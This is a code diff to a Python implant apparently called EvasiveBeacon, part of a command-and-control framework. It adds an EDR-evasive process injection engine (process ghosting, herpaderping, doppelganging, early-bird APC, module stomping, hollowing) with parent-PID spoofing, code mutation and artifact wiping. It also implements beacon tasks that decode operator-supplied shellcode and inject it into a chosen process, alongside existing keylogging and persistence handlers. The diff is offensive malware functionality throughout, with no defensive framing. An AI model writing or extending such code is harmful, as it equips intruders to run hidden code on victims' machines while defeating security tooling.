@@ -57,6 +57,25 @@ except ImportError:
     CloakLevel = None
     print("[!] Sleepmask cloaking not available")
 
+# NEW: Import process injection masterclass
+try:
+    from evasion.process_injection_masterclass import (
+        ProcessInjectionMasterclass,
+        AIInjectionSelector,
+        InjectionTechnique,
+        InjectionConfig,
+        EDRProduct as InjectionEDRProduct,
+        create_masterclass_injector,
+        quick_inject,
+        get_ai_recommendation as get_injection_recommendation
+    )
+    INJECTION_AVAILABLE = True
+except ImportError:
+    INJECTION_AVAILABLE = False
+    ProcessInjectionMasterclass = None
+    InjectionTechnique = None
+    print("[!] Process injection masterclass not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -81,6 +100,12 @@ class BeaconConfig:
     enable_artifact_wipe: bool = True
     enable_rop: bool = True
     remask_interval: int = 30  # Remask every N seconds during long sleeps
+    # NEW: Process injection settings
+    enable_injection: bool = True
+    injection_technique: str = "ai_select"  # ai_select, ghosting, early_bird, etc.
+    enable_ppid_spoof: bool = True
+    enable_mutation: bool = True
+    injection_delay_ms: int = 2000
 
 
 @dataclass
@@ -131,6 +156,11 @@ class EvasiveBeacon:
         if CLOAKING_AVAILABLE and config.enable_cloaking:
             self._init_cloaking()
         
+        # NEW: Initialize process injection engine
+        self.injection_engine = None
+        if INJECTION_AVAILABLE and config.enable_injection:
+            self._init_injection()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -142,6 +172,7 @@ class EvasiveBeacon:
             "keylog": self._handle_keylog,
             "persist": self._handle_persist,
             "migrate": self._handle_migrate,
+            "inject": self._handle_inject,  # NEW
             "exit": self._handle_exit,
         }
         
@@ -189,6 +220,61 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize cloaking: {e}")
             self.cloaking_engine = None
+    
+    def _init_injection(self):
+        """Initialize process injection masterclass engine"""
+        if not INJECTION_AVAILABLE:
+            return
+        
+        try:
+            # Determine technique
+            technique = None
+            if self.config.injection_technique != "ai_select":
+                technique_map = {
+                    'ghosting': InjectionTechnique.PROCESS_GHOSTING,
+                    'herpaderping': InjectionTechnique.PROCESS_HERPADERPING,
+                    'transacted_hollowing': InjectionTechnique.TRANSACTED_HOLLOWING,
+                    'doppelganging': InjectionTechnique.PROCESS_DOPPELGANGING,
+                    'module_stomping': InjectionTechnique.MODULE_STOMPING,
+                    'early_bird_apc': InjectionTechnique.EARLY_BIRD_APC,
+                    'early_bird': InjectionTechnique.EARLY_BIRD_APC,
+                    'thread_hijack': InjectionTechnique.THREAD_HIJACK,
+                    'hollowing': InjectionTechnique.PROCESS_HOLLOWING,
+                    'syscall': InjectionTechnique.SYSCALL_INJECTION,
+                    'classic_crt': InjectionTechnique.CLASSIC_CRT,
+                }
+                technique = technique_map.get(
+                    self.config.injection_technique.lower(),
+                    None
+                )
+            
+            # Create config
+            config = InjectionConfig(
+                technique=technique or InjectionTechnique.EARLY_BIRD_APC,
+                ai_adaptive=self.config.injection_technique == "ai_select",
+                auto_detect_edr=True,
+                enable_ppid_spoof=self.config.enable_ppid_spoof,
+                enable_mutation=self.config.enable_mutation,
+                enable_artifact_wipe=self.config.enable_artifact_wipe,
+                delay_execution_ms=self.config.injection_delay_ms,
+            )
+            
+            # Create engine
+            self.injection_engine = ProcessInjectionMasterclass(config)
+            
+            # Get AI recommendation
+            selector = AIInjectionSelector(config)
+            rec_technique, profile_info = selector.detect_and_select()
+            
+            print(f"[+] Process injection initialized: AI={self.config.injection_technique == 'ai_select'}")
+            print(f"    Primary technique: {rec_technique.value}")
+            print(f"    Detected EDR: {profile_info.get('profile', {}).get('name', 'None')}")
+            print(f"    PPID Spoof: {self.config.enable_ppid_spoof}")
+            print(f"    Mutation: {self.config.enable_mutation}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize injection engine: {e}")
+            self.injection_engine = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -660,13 +746,119 @@ class EvasiveBeacon:
         return "Scheduled task persistence established"
     
     def _handle_migrate(self, task: Dict) -> str:
-        """Process migration (Windows only)"""
+        """Process migration with injection masterclass (Windows only)"""
         target_pid = task.get('pid')
-        if not target_pid:
-            raise ValueError("No target PID specified")
+        target_name = task.get('process')
+        shellcode = task.get('shellcode')
         
-        # Would need process injection from evasion module
-        return f"Migration to PID {target_pid} not yet implemented"
+        if not self.injection_engine:
+            return "Migration failed: Injection engine not available"
+        
+        if not target_pid and not target_name:
+            return "Migration failed: No target PID or process name specified"
+        
+        try:
+            # If no shellcode provided, generate beacon shellcode
+            if not shellcode:
+                # Would generate beacon shellcode here
+                return "Migration requires shellcode - use inject task with shellcode"
+            
+            # Decode shellcode if base64
+            if isinstance(shellcode, str):
+                import base64
+                shellcode = base64.b64decode(shellcode)
+            
+            # Perform injection
+            result = self.injection_engine.inject(
+                shellcode=shellcode,
+                pid=target_pid,
+                technique=None  # AI selects
+            )
+            
+            if result.success:
+                return f"Migration successful: {result.technique.value} -> PID {result.target_pid} ({result.target_name})"
+            else:
+                return f"Migration failed: {result.error}"
+                
+        except Exception as e:
+            return f"Migration error: {e}"
+    
+    def _handle_inject(self, task: Dict) -> str:
+        """Inject shellcode using masterclass engine"""
+        shellcode_b64 = task.get('shellcode')
+        target_pid = task.get('pid')
+        technique = task.get('technique')
+        
+        if not self.injection_engine:
+            return "Injection failed: Injection engine not available"
+        
+        if not shellcode_b64:
+            return "Injection failed: No shellcode provided"
+        
+        try:
+            # Decode shellcode
+            import base64
+            shellcode = base64.b64decode(shellcode_b64)
+            
+            # Parse technique if specified
+            inject_technique = None
+            if technique and technique != "ai_select":
+                technique_map = {
+                    'ghosting': InjectionTechnique.PROCESS_GHOSTING,
+                    'herpaderping': InjectionTechnique.PROCESS_HERPADERPING,
+                    'early_bird': InjectionTechnique.EARLY_BIRD_APC,
+                    'module_stomping': InjectionTechnique.MODULE_STOMPING,
+                    'syscall': InjectionTechnique.SYSCALL_INJECTION,
+                    'classic_crt': InjectionTechnique.CLASSIC_CRT,
+                }
+                inject_technique = technique_map.get(technique.lower())
+            
+            # Perform injection
+            result = self.injection_engine.inject(
+                shellcode=shellcode,
+                pid=target_pid,
+                technique=inject_technique
+            )
+            
+            # Build response
+            if result.success:
+                response = {
+                    "status": "success",
+                    "technique": result.technique.value,
+                    "target_pid": result.target_pid,
+                    "target_name": result.target_name,
+                    "thread_id": result.thread_id,
+                    "ppid_spoofed": result.ppid_spoofed,
+                    "mutations_applied": len(result.mutations_applied),
+                    "artifacts_wiped": len(result.artifacts_wiped),
+                    "evasion_score": result.evasion_score,
+                    "phantom_process": result.phantom_process,
+                    "fallback_used": result.fallback_used,
+                }
+                return json.dumps(response)
+            else:
+                return f"Injection failed: {result.error} (tried: {result.chain_attempts})"
+                
+        except Exception as e:
+            return f"Injection error: {e}"
+    
+    def get_injection_status(self) -> Dict[str, Any]:
+        """Get injection engine status"""
+        if not self.injection_engine:
+            return {"available": False, "reason": "Engine not initialized"}
+        
+        # Get AI recommendation
+        selector = AIInjectionSelector()
+        technique, profile = selector.detect_and_select()
+        
+        return {
+            "available": True,
+            "detected_edr": profile.get('profile', {}).get('name', 'None'),
+            "primary_technique": technique.value,
+            "ppid_spoof_enabled": self.config.enable_ppid_spoof,
+            "mutation_enabled": self.config.enable_mutation,
+            "artifact_wipe_enabled": self.config.enable_artifact_wipe,
+        }
     
     def _handle_exit(self, task: Dict) -> str:
         """Stop beacon"""
